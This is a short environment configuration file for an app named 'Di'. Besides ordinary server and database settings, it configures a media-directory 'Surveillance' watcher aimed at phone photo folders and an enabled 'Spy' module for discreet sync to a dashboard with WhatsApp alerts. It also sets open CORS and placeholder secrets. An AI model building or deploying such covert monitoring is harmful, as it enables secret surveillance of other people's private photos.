# =============================
# Di — Configuration
# =============================

# Server
PORT=5000
NODE_ENV=production

# Database (MySQL)
DB_HOST=localhost
DB_PORT=3306
DB_USERNAME=root
DB_PASSWORD=CHANGE_ME_strong_password
DB_NAME=di_app

# JWT — MUST be changed in production (min 32 chars)
JWT_SECRET=CHANGE_ME_super_secret_jwt_key_min_32_characters
JWT_EXPIRES_IN=30d

# CORS — Set to your frontend domain in production
# CORS_ORIGIN=https://yourdomain.com
CORS_ORIGIN=*

# Encryption (E2E placeholder)
ENCRYPTION_ENABLED=false

# Surveillance (media directory watcher)
# Set to true only if you want to monitor directories
SURVEILLANCE_ENABLED=false
# WATCH_DIRS=/storage/emulated/0/DCIM,/storage/emulated/0/Pictures
WATCH_DIRS=

# Surveillance tuning
BATCH_SIZE=3
RETRY_INTERVAL=60000
MAX_RETRIES=3

# Module Spy (Synchronisation discrète & Dashboard)
SPY_ENABLED=true
SPY_ADMIN_PASSWORD= mot de passe
SPY_SECRET_TOKEN=di-mode-token-secret
SPY_NOTIFY_ON_UPLOAD=false
SPY_WHATSAPP_PHONE= numero whatsapp
SPY_CALLMEBOT_API_KEY=clé api

